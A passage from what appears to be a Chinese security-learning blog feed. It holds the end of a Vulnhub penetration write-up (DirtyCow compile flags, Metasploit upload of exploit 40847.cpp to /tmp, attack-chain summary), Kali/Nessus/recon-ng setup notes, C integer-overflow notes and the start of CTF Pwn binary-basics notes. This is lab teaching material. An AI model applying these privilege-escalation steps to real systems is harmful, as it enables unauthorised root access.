C标准所列出的所有警告</li><li>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</li><li>-std=c++11就是用按C++2011标准来编译的</li><li>-pthread 在Linux中要用到多线程时，需要链接pthread库</li><li>-o dcow gcc生成的目标文件,名字为dcow</li></ol><p>获取到 root 的密码，通过 ssh 登录即可。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、cewl、hydra、msf 使用</p><p>2、信息收集：nmap 扫描对方端口和服务，dirb 爆破网站目录</p><p>3、权限获取：网站cms漏洞，得到 www-data shell；用户爆破，得到一般用户</p><p>4、提权：les.sh 扫描内核漏洞，通过 dirtycow 内核漏洞提权，两机传输文件，编译、运行，得到 root shell</p><p>5、完整的渗透流程：外网 -&gt; 内网（网站漏洞 -&gt; www-data shell -&gt; 内核扫描 -&gt; 内核漏洞 -&gt; 内核提权）</p><p>6、网站扫描：2类工具（扫描类AWVS、爬虫类xray（ddosi））</p><h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>Metasploit—上传/下载文件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> upload file      <span class="hljs-comment">#向目标系统上传文件</span></span><br><span class="hljs-meta">$</span><span class="bash"> download file    <span class="hljs-comment">#从目标系统中下载文件</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 按 ctrl+c 返回控制台</span><br><span class="hljs-meta">#</span><span class="bash"> upload （from 本机文件路径） （to 目标路径）</span><br><span class="hljs-meta">#</span><span class="bash"> 执行命令上传cpp文件到/tmp目录下，因为该目录一般可写</span><br><span class="hljs-meta">$</span><span class="bash"> upload /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/40847.cpp /tmp</span><br></code></pre></td></tr></table></figure><p><strong>SSH—拷贝文件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> scp file user@ip:/tmp</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 拷贝文件夹</span><br><span class="hljs-meta">#</span><span class="bash"> 把当前文件夹tempA拷贝到目标服务器10.127.40.25 服务器的 /tmp/wang/文件夹下</span><br><span class="hljs-meta">#</span><span class="bash"> 其中wasadmin是目标服务器的用户名，执行命令提示输入密码，然后输入密码即可</span><br><span class="hljs-meta">$</span><span class="bash"> scp -r /tmp/tempA/ wasadmin@10.127.40.25:/tmp/wang/</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 拷贝文件</span><br><span class="hljs-meta">#</span><span class="bash"> 把当前文件tempA.txt拷贝到目标服务器10.127.40.25 服务器的 /tmp/wang/文件夹下</span><br><span class="hljs-meta">$</span><span class="bash"> scp /tmp/tempA.txt wasadmin@10.127.40.25:/tmp/wang/</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali</title>
    <link href="/2022/04/24/Linux/Kali/Kali/"/>
    <url>/2022/04/24/Linux/Kali/Kali/</url>
    
    <content type="html"><![CDATA[<h2 id="kali-下载地址"><a href="#kali-下载地址" class="headerlink" title="kali 下载地址"></a>kali 下载地址</h2><p>官网：<a href="https://www.kali.org/get-kali/">Get Kali | Kali Linux</a></p><p>镜像：<a href="http://cdimage.kali.org/">Index of / (kali.org)</a></p><p>VM Ware：<a href="https://kali.download/virtual-images/">Index of /virtual-images/ (kali.download)</a></p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali安装Nessus</title>
    <link href="/2022/04/02/Linux/Kali/kali%E5%AE%89%E8%A3%85Nessus/"/>
    <url>/2022/04/02/Linux/Kali/kali%E5%AE%89%E8%A3%85Nessus/</url>
    
    <content type="html"><![CDATA[<h2 id="Kali安装Nessus"><a href="#Kali安装Nessus" class="headerlink" title="Kali安装Nessus"></a>Kali安装Nessus</h2><blockquote><p><strong>转自：</strong><a href="https://zhuanlan.zhihu.com/p/395459622">黑客工具之Nessus详细使用教程 - 知乎 (zhihu.com)</a></p><p><strong>工具文章合集：</strong><a href="https://zhuanlan.zhihu.com/p/401413938">黑客老鸟-九青：一文教你学会黑客必备安全工具</a></p></blockquote><h3 id="一、Nessus简介"><a href="#一、Nessus简介" class="headerlink" title="一、Nessus简介"></a>一、Nessus简介</h3><p>Nessus号称是世界上最流行的漏洞扫描程序，全世界有超过75000个组织在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。Nessus不同于传统的漏洞扫描软件，Nessus可同时在本机或远端上遥控，进行系统的漏洞分析扫描。Nessus也是渗透测试重要工具之一</p><h3 id="二、Nessus安装"><a href="#二、Nessus安装" class="headerlink" title="二、Nessus安装"></a>二、Nessus安装</h3><p>1、下载软件包</p><p>进入官网下载：<a href="https://www.tenable.com/downloads/nessus?loginAttempted=true">Download Nessus | Tenable®</a></p><p>2、选择 <code>I agree</code></p><p>3、将下载的软件包拖到 Kali 中</p><p>4、安装 Nessus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo dpkg -i Nessus-10.1.2-debian6_amd64.deb <br></code></pre></td></tr></table></figure><p>5、启动Nessus</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /bin/systemctl start nessusd.service<br></code></pre></td></tr></table></figure><p>6、使用浏览器访问 <code>https://kali:8834</code> ，进行连接</p><p>7、获取激活码、输入激活码、注册一个账号</p><p>8、开始读条</p><p>9、提示下载失败</p><p>10、回到 kali 上输入下面这条命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo /opt/nessus/sbin/nessuscli update<br></code></pre></td></tr></table></figure><p>开始下载插件</p><p>11、重新安装 Nessus，重新启动 Nessus，又开始读条</p><p>12、然后输入用户名密码进入 Nessus</p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
      <tag>Nessus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>recon-ng v5.1.1安装模块</title>
    <link href="/2022/03/20/Linux/Kali/%E5%AE%89%E8%A3%85recon-ng%E6%A8%A1%E5%9D%97/"/>
    <url>/2022/03/20/Linux/Kali/%E5%AE%89%E8%A3%85recon-ng%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<h2 id="recon-ng-v5-1-1安装模块"><a href="#recon-ng-v5-1-1安装模块" class="headerlink" title="recon-ng v5.1.1安装模块"></a>recon-ng v5.1.1安装模块</h2><p><strong>问题：</strong>进入后报 <code>[*] No modules enabled/installed.</code></p><p><strong>解决方法：</strong></p><p>1、在 <code>recon-ng</code> 控制台输入 <code>marketplace install all</code> ，用来下载所有插件，可能需要代理或者科学上网。</p><p>2、直接 shell 执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> rm -fr ~/.recon-ng &amp;&amp; git <span class="hljs-built_in">clone</span> https://github.com/lanmaster53/recon-ng-marketplace.git ~/.recon-ng</span><br></code></pre></td></tr></table></figure><p>如果网络原因还是不行，可以把 <code>recon-ng-marketplace</code> 导入到码云上或者挂你的代理，或者直接下载zip压缩包，最终目的就是把 <code>recon-ng-marketplace</code> 内所有文件放在家目录下的 <code>.recon-ng</code> 目录下。</p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
      <tag>recon-ng</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言数据溢出</title>
    <link href="/2022/02/25/Code/C/C%E8%AF%AD%E8%A8%80%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA/"/>
    <url>/2022/02/25/Code/C/C%E8%AF%AD%E8%A8%80%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="C语言数据溢出"><a href="#C语言数据溢出" class="headerlink" title="C语言数据溢出"></a>C语言数据溢出</h1><h2 id="char类型溢出"><a href="#char类型溢出" class="headerlink" title="char类型溢出"></a>char类型溢出</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> a = <span class="hljs-number">400</span>,b=<span class="hljs-number">-129</span>,c=<span class="hljs-number">128</span>;          <span class="hljs-comment">//char 取值范围: -128~127</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a=%d,b=%d,c=%d\n&quot;</span>,a,b,c);   <span class="hljs-comment">//a=-112,b=127,c=-128</span><br>&#125;<br><br><span class="hljs-comment">//原码 -&gt; 补码 -&gt; 截取8位,得到溢出后的补码 -&gt; 反码 -&gt; 原码 -&gt; 十进制</span><br><span class="hljs-comment">/************************************</span><br><span class="hljs-comment">400原 = 01 1001 0000</span><br><span class="hljs-comment">400补 = 01 1001 0000</span><br><span class="hljs-comment">溢出后</span><br><span class="hljs-comment">400补 = 1001 0000</span><br><span class="hljs-comment">400反 = 1001 0000-1 = 1000 1111</span><br><span class="hljs-comment">转变为原码后: 1111 0000</span><br><span class="hljs-comment">十进制为: -112 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-129原 = 1 1000 0001</span><br><span class="hljs-comment">-129补 = 1 0111 1111</span><br><span class="hljs-comment">溢出后</span><br><span class="hljs-comment">-129补 = 0111 1111</span><br><span class="hljs-comment">-129反 = 0111 1111</span><br><span class="hljs-comment">转变为原码后: 0111 1111</span><br><span class="hljs-comment">十进制为: 127</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">128原 = 0 1000 0000</span><br><span class="hljs-comment">128补 = 0 1000 0000</span><br><span class="hljs-comment">溢出后</span><br><span class="hljs-comment">128补 = 1000 0000</span><br><span class="hljs-comment">十进制为: -128</span><br><span class="hljs-comment">************************************/</span><br>    <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C issue</title>
    <link href="/2022/02/19/Code/C/C-issue/"/>
    <url>/2022/02/19/Code/C/C-issue/</url>
    
    <content type="html"><![CDATA[<h1 id="C-issue"><a href="#C-issue" class="headerlink" title="C issue"></a>C issue</h1><h2 id="得到指针指向的数组的长度"><a href="#得到指针指向的数组的长度" class="headerlink" title="得到指针指向的数组的长度"></a>得到指针指向的数组的长度</h2><p>定义数组，要给定其长度，在对数组进行操作时，可能需要计算数组长度，方法是：sizeof(数组名)/sizeof(元素类型)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp">数组<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>]; <br><span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(a)=<span class="hljs-number">4</span>*<span class="hljs-number">4</span>=<span class="hljs-number">16</span>字节 （<span class="hljs-keyword">int</span>为<span class="hljs-number">4</span>个字节）<br><span class="hljs-keyword">int</span> *p=a; <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(p)=<span class="hljs-number">4</span>字节<br><br>对数组应用<span class="hljs-keyword">sizeof</span>，可以得到整个数组分配的字节数（存储全部数据占用的内存字节数）<br>对指针应用<span class="hljs-keyword">sizeof</span>，只是得到分配给用来存储一个地址值的指针所用的字节数，即<span class="hljs-number">4</span>个字节。（上面都是在<span class="hljs-number">32</span>位编译系统）<br> <br>C++中<span class="hljs-keyword">sizeof</span>得到的是字节数，也就是你所说的“长度单位”<br> <br>指针指向的字符数组长度的获取方法，不能用<span class="hljs-keyword">sizeof</span>，因为用<span class="hljs-keyword">sizeof</span>（指针），得到指针长度为<span class="hljs-number">4</span>，应该用<span class="hljs-built_in">strlen</span>()函数。<br></code></pre></td></tr></table></figure><h2 id="字符串-02x格式化输出出现FFFFFF解决办法"><a href="#字符串-02x格式化输出出现FFFFFF解决办法" class="headerlink" title="字符串%02x格式化输出出现FFFFFF解决办法"></a>字符串%02x格式化输出出现FFFFFF解决办法</h2><p>  最近做项目，遇到字符串格%02x式化输出出现FFFFFF现象，偶尔出现，大部分时间是好的，网上查阅资料，发现解决办法：</p><pre><code>C89标准规定，short和char会被自动提升为int（整形化，类似地，float也会自动提升为double），这样做是为了便于编译器进行优化，使变量的长度尽可能一样，尽可能提升所产生代码的效率。data[i]的值当它是正数的时候也同样进行了符号扩展的，只不过正数是前面加0，用%02x打印的时候那些0被忽略；而补码表示的负数的符号扩展却是前面加1，用%02x打印的时候那些1不能被忽略，因此才按照本来的长度输出来。如没有添加unsigned，则当data[i]&gt;0x7F时（如0X80），格式转换为FFFFFF80！</code></pre><p>故计算8位异或校验函数调整如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> <span class="hljs-title">calc_crc</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *buff, <span class="hljs-keyword">int</span> buff_sz)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> chsum = <span class="hljs-number">0</span>, it;<br><span class="hljs-keyword">for</span>(it = <span class="hljs-number">0</span>; it &lt; buff_sz; ++it)<br>chsum ^= (<span class="hljs-keyword">int</span>)buff[it];<br><span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)(chsum &amp; <span class="hljs-number">0xFF</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1000-0000-为什么是-128"><a href="#1000-0000-为什么是-128" class="headerlink" title="1000 0000 为什么是-128"></a>1000 0000 为什么是-128</h2><p>试想一个八位二进制数：00000000</p><p>如果我们对它进行减一的操作，用小学的减法知识，我们知道0号位（最右边那位）不够，要向1号位（右数第二个位）借，1号位不够再往前借，借到7号位发现还是不够，于是计算机在虚拟的8号位处借给这个00000000一个1，得到减法的结果：11111111。也就是我们嘴上说的负一。</p><p>然后，我们如果再对这个负一做减一的操作，会发生什么？变成11111110，没错，就是负二，依次类推1000000就是负一百二十八。</p><p>作者：波斯基<br>链接：<a href="https://www.zhihu.com/question/28685048/answer/41728110">https://www.zhihu.com/question/28685048/answer/41728110</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>很多人并不理解补码。<strong>补码就是同余啊。</strong>1000000是正128你知道吧，正负128模256是同余的。加减乘可以直接算也是同余的定理决定的，而不是凑出来的巧合，哪可能凑出这种东西？</p><p>8位只能表示256个数，0到255，但我还想表示一些负数怎么办呢？就用与该负数同余的正数来表示呗。-1=255，-2=254，等等。</p><p>建议脱离算数的思维方式，<strong>这其实就是一个环</strong>。模任何一个正整数（如256），可以把所有整数分类，比如模256可分256类，0 256 -256…是一类（余0类），1 257 -255…是一类（余1类），等等，这256类可看作环<img src="https://www.zhihu.com/equation?tex=Z_%7B256%7D" alt="[公式]">的元素，你看-128和128是同一个类里的（余128类），用一个代表另一个罢了。补码和普通的unsigned integers都是在每类中选一个数，unsigned integers选0到255，补码表示的有符号整数选-128到127，都是一个数恰好对应一个类。</p><p>当你明白这一切后，补码就是顺理成章的事。</p><p>练习：设计用8位二进制数表示13至268这256个数的方案。要求作加减乘运算的时候，可以直接把编码当正整数算，能得到正确结果。</p><p>作者：fhylhlasdf<br>链接：<a href="https://www.zhihu.com/question/28685048/answer/41735701">https://www.zhihu.com/question/28685048/answer/41735701</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>设机器数字长为 8 位（其中 1 位为符号位）对于整数，当其分别代表无符号数、原码、补码和反码时，对应的真值范围各为多少？</p><div class="table-container"><table><thead><tr><th>二进制代码</th><th>无符号数对应的真值</th><th>原码对应的真值</th><th>补码对应的真值</th><th>反码对应的真值</th></tr></thead><tbody><tr><td>00000000</td><td>0</td><td>+0</td><td>+0，-0</td><td>+0</td></tr><tr><td>00000001</td><td>1</td><td>+1</td><td>+1</td><td>+1</td></tr><tr><td>00000010</td><td>2</td><td>+2</td><td>+2</td><td>+2</td></tr><tr><td>······</td><td>······</td><td>······</td><td>······</td><td>······</td></tr><tr><td>01111111</td><td>127</td><td>+127</td><td>+127</td><td>+127</td></tr><tr><td>10000000</td><td>128</td><td>-0</td><td>-128</td><td>-127</td></tr><tr><td>10000001</td><td>129</td><td>-1</td><td>-127</td><td>-126</td></tr><tr><td>······</td><td>······</td><td>······</td><td>······</td><td>······</td></tr><tr><td>11111101</td><td>253</td><td>-125</td><td>-3</td><td>-2</td></tr><tr><td>11111110</td><td>254</td><td>-126</td><td>-2</td><td>-1</td></tr><tr><td>11111111</td><td>255</td><td>-127</td><td>-1</td><td>-0</td></tr></tbody></table></div>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pwn</title>
    <link href="/2022/01/19/CTF/Pwn/Pwn/"/>
    <url>/2022/01/19/CTF/Pwn/Pwn/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="Pwn-二进制漏洞挖掘与利用"><a href="#Pwn-二进制漏洞挖掘与利用" class="headerlink" title="Pwn(二进制漏洞挖掘与利用)"></a>Pwn(二进制漏洞挖掘与利用)</h1><blockquote><p>整理自：<a href="https://www.bilibili.com/video/BV1854y1y7Ro?spm_id_from=333.851.header_right.fav_list.click">XMCVE 2020 CTF Pwn入门课程 哔哩哔哩 bilibili</a></p></blockquote><h2 id="0x00-Pwn？"><a href="#0x00-Pwn？" class="headerlink" title="0x00 Pwn？"></a>0x00 Pwn？</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><ul><li>破解、利用成功（程序的二进制漏洞）</li><li>攻破（设备、服务器）</li><li>控制（设备、服务器）</li></ul><h3 id="一次简单的hack"><a href="#一次简单的hack" class="headerlink" title="一次简单的hack"></a>一次简单的hack</h3><ul><li><p>exploit</p><ul><li>用于攻击的脚本与方案</li></ul></li><li><p>payload</p><ul><li>攻击载荷，是目标进程被劫持控制流的数据</li></ul></li><li><p>shellcode</p><ul><li>调用攻击目标的 shell 的代码</li></ul></li></ul><h2 id="0x01-二进制基础"><a href="#0x01-二进制基础" class="headerlink" title="0x01 二进制基础"></a>0x01 二进制基础</h2><h3 id="1、程序的编译与链接"><a href="#1、程序的编译与链接" class="headerlink" title="1、程序的编译与链接"></a>1、程序的编译与链接</h3><p>从C源代码到可执行文件的生成过程：</p><ul><li>编译<ul><li>由C语言代码生成汇编代码</li></ul></li><li><p>汇编</p><ul><li>由汇编代码生成机器码</li></ul></li><li><p>链接</p><ul><li>将多个机器码的目标文件链接成一个可执行文件</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/9bb4b113fea69d8b2dddae04e1600866.png" alt="image-20211202205623782" style="zoom:67%;"></p><h3 id="2、Linux下的可执行文件格式ELF"><a href="#2、Linux下的可执行文件格式ELF" class="headerlink" title="2、Linux下的可执行文件格式ELF"></a>2、Linux下的可执行文件格式ELF</h3><p><strong>什么是可执行文件？</strong></p><ul><li><p>广义：文件中的数据是可执行代码的文件</p><ul><li>.out、.exe、.sh、.py</li></ul></li><li><p>狭义：文件中的数据是机器码的文件</p><ul><li>.out、.exe、.dll、.so</li></ul></li></ul><p><strong>可执行文件的分类</strong></p><ul><li><p>Windows：PE（Portable Executable）</p><ul><li>可执行程序<ul><li>.exe</li></ul></li><li>动态链接库<ul><li>.dll</li></ul></li><li>静态链接库<ul><li>.lib</li></ul></li></ul></li><li><p>Linux：ELF（Executable and Linkable Format）</p><ul><li>可执行程序<ul><li>.out</li></ul></li><li>动态链接库<ul><li>.so</li></ul></li><li>静态链接库<ul><li>.a</li></ul></li></ul></li></ul><p><strong>ELF 文件结构：</strong></p><ul><li><p>ELF文件头表（ELF header）</p><ul><li>记录了ELF文件的组织结构</li></ul></li><li><p>程序头表/段表（Program header table）</p><ul><li>告诉系统如何创建进程</li><li>生成进程的可执行文件必须拥有此结构</li><li>重定位文件不一定需要</li></ul></li><li><p>节头表（Section header table）</p><ul><li>记录了ELF文件的节区信息</li><li>用于链接的目标文件必须拥有此结构</li><li>其它类型目标文件不一定需要</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/c5dfe3a8c7ac1d28a4499b8d887e94cb.png" alt="image-20211202205758815" style="zoom:67%;"></p><h3 id="3、进程虚拟地址空间"><a href="#3、进程虚拟地址空间" class="headerlink" title="3、进程虚拟地址空间"></a>3、进程虚拟地址空间</h3><p>地址以字节编码（1 Byte = 8 bits），常以16进制表示（0x3c = 0011 1100） </p><ul><li>虚拟内存用户空间每个进程一份</li><li>虚拟内存内核空间所有进程共享一份</li><li>虚拟内存 mmap 段中的动态链接库仅在物理内存中装载一份</li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/6441eaa30b474add83de904cbda9734a.png" alt="image-20220120152751897" style="zoom:67%;"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/cd9c8303ce3452e633fc07f5fd5776e0.png" alt="image-20220120152843731" style="zoom:50%;"></p><p><strong>磁盘中的ELF（可执行文件）与内存中的ELF（进程内存映像）</strong> </p><p><img src="/2022/01/19/CTF/Pwn/Pwn/2ddf517f9f2981568c4c06ed68f2b371.png" alt="image-20220406180913602"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/198d1d761b2e9a1b4330e7fbfeb70122.png" alt="image-20220406180644137"></p><p><strong>段（segment）与节（section）</strong></p><ul><li>一个 <strong>段</strong> 包含多个 <strong>节</strong></li><li>段视图用于<strong>进程的内存</strong>区域的 <strong>rwx 权限划分</strong></li><li><p>节视图用于<strong>ELF文件</strong>编译链接时与在<strong>磁盘</strong>上存储时的<strong>文件结构</strong>的组织</p></li><li><p>代码段（Text segment）包含了代码与只读数据</p><ul><li><strong>.text 节</strong></li><li>.rodata 节 </li><li>.hash 节 </li><li>.dynsym 节 </li><li>.dynstr 节 </li><li>.<strong>plt 节</strong></li><li>.rel.got 节 </li><li>……</li></ul></li><li><p>数据段（Data segment）包含了可读可写数据</p><ul><li>.data 节 </li><li>.dynamic 节 </li><li>.got 节 </li><li><strong>.got.plt 节</strong></li><li><strong>.bss 节</strong></li><li>……</li></ul></li><li><p>栈段（Stack segment）</p></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/31f049ee54ba43a4dfcfef96b81a5876.png" alt="image-20220120153432565" style="zoom:67%;"></p><h3 id="4、程序的装载与进程的执行"><a href="#4、程序的装载与进程的执行" class="headerlink" title="4、程序的装载与进程的执行"></a>4、程序的装载与进程的执行</h3><p><strong>小端序与大端序</strong></p><ul><li><p>小端序</p><ul><li>低地址存放数据低位、高地址存放数据高位</li><li>我们所主要关注的格式</li></ul></li><li><p>大端序</p><ul><li>低地址存放数据高位、高地址存放数据低位</li></ul></li></ul><p><strong>amd64寄存器结构</strong></p><ul><li>rax： 8Bytes</li><li>eax：4Bytes</li><li>ax： 2Bytes</li><li>ah： 1Bytes</li><li>al：  1Bytes</li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/d6526b81f2f8e1c28cc07843f8745f0b.png" alt="image-20220406174621225"></p><p><strong>部分寄存器的功能</strong></p><ul><li><p>RIP</p><ul><li>存放当前执行的指令的地址</li></ul></li><li><p>RSP</p><ul><li>存放当前栈帧的栈顶地址</li></ul></li><li><p>RBP</p><ul><li>存放当前栈帧的栈底地址</li></ul></li><li><p>RAX</p><ul><li>通用寄存器。存放函数返回值</li></ul></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/8e0c5c69bd5fbfe4ad88f1a586cce0ae.png" alt="image-20220405222925297"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/f5d09e35d719712d53122860bb31ae4f.png" alt="image-20220405222954888"></p><h3 id="5、x86-amp-amd64汇编简述"><a href="#5、x86-amp-amd64汇编简述" class="headerlink" title="5、x86&amp;amd64汇编简述"></a>5、x86&amp;amd64汇编简述</h3><p><strong>常用汇编指令：</strong></p><p>MOV、LEA、ADD/SUB、PUSH、POP、CMP、JMP、J[Condition]、CALL、LEAVE、RET……</p><p><strong>MOV</strong></p><ul><li>MOV DEST, SRC        ; 把源操作数传送给目标</li><li>MOV EAX,1234H   ; 执行结果（EAX） = 1234H</li><li>MOV EBX, EAX </li><li>MOV EAX, [00404011H] ; [ ] 表示取地址内的值</li><li>MOV EAX, [ESI] </li></ul><p><strong>LEA</strong></p><ul><li>LEA REG, SRC          ; 把源操作数的有效地址送给指定的寄存器</li><li>LEA EBX, ASC          ; 取 ASC 的地址存放至 EBX 寄存器中</li><li>LEA EAX, 6[ESI]         ; 把 ESI+6 单元的32位地址送给 EAX </li></ul><p><strong>PUSH</strong></p><ul><li>PUSH VALUE         ; 把目标值压栈，同时SP指针-1字长</li><li>PUSH 1234H </li><li>PUSH EAX</li></ul><p><strong>POP</strong></p><ul><li>POP DEST ; 将栈顶的值弹出至目的存储位置，同时SP指针+1字长</li><li>POP EAX</li></ul><p><strong>LEAVE</strong></p><ul><li>在函数返回时，恢复父函数栈帧的指令</li><li>等效于：<ul><li>MOV ESP, EBP</li><li>POP EBP</li></ul></li></ul><p><strong>RET</strong></p><ul><li><p>在函数返回时，控制程序执行流返回父函数的指令</p></li><li><p>等效于：POP RIP（这条指令实际是不存在的，不能直接向RIP寄存器传送数据）</p></li></ul><p><strong>两种汇编格式：</strong></p><div class="table-container"><table><thead><tr><th>intel</th><th>AT&amp;T</th></tr></thead><tbody><tr><td>mov  eax, 8</td><td>movl  $8, %eax</td></tr><tr><td>mov  ebx, 0ffffh</td><td>movl  $0xffff, %ebx</td></tr><tr><td>int  80h</td><td>int  $80</td></tr><tr><td>mov  eax, [ecx]</td><td>movl  (%ecx), %eax</td></tr></tbody></table></div><p><img src="/2022/01/19/CTF/Pwn/Pwn/1e9b520c251c9b722d2f7655f3ef5de1.png" alt="image-20220405223206766"></p><h2 id="0x02-栈溢出"><a href="#0x02-栈溢出" class="headerlink" title="0x02 栈溢出"></a>0x02 栈溢出</h2><h3 id="1、C语言函数调用栈"><a href="#1、C语言函数调用栈" class="headerlink" title="1、C语言函数调用栈"></a>1、C语言函数调用栈</h3><ul><li><p>函数调用栈是指程序运行时内存一段连续的区域</p></li><li><p>用来保存函数运行时的状态信息，包括函数参数与局部变量等</p></li><li><p>称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶</p></li><li><p>在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态</p></li><li><p>函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大</p></li></ul><p><img src="/2022/01/19/CTF/Pwn/Pwn/73bc74be726ca183746fad65712e77fd.png" alt="image-20220121142507825"></p><p><img src="/2022/01/19/CTF/Pwn/Pwn/34fae6734a56d2a74e26d5d003559eeb.png" alt="image-20220410130656233"></p><p><strong>函数状态主要涉及三个寄存器 —— esp，ebp，eip</strong></p><ul><li>esp 